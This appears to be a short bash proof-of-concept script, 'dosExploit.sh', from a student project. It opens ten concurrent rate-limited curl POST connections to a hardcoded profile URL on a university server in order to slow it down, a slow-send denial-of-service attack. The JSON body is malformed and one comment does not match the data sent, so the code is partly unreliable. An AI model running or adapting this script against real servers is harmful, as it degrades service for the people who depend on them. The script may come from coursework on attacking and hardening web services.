#!/bin/bash
#
#   Author: Kyle Dixon
#   Usage: ./dosExploit.sh       (all other info hardcoded here)
#   Description: This attack is a proof of concept
#   This attack opens 10 concurrent connections to the server and slowly sends a record
#   WARNING: THIS WILL SLOW DOWN THE USER COMPUTER
#   Weak servers will slow down while waiting for the record to completely send from the user
#   Change the limit rate value to change how fast the record is sent


#Test Function
function slowConnection() {
    url='http://flip3.engr.oregonstate.edu:6061/user/Kyle&12345'    #URL of user profile page
    #The record name 800 is used by the buffer to allocated space instead of saving a string
    res=$(curl -X POST "${url}" --limit-rate 100 --data '{"add_record_name":"Slowdown",add_record_password":"Slowdown","add_record_URL":"Slowdown","add_record_user":2}' --header "Content-Type: application/json")
}


#Main function
for i in {1..10}
do
    echo "[+] Starting new slowdown connection" 
    slowConnection &
done
exit 0
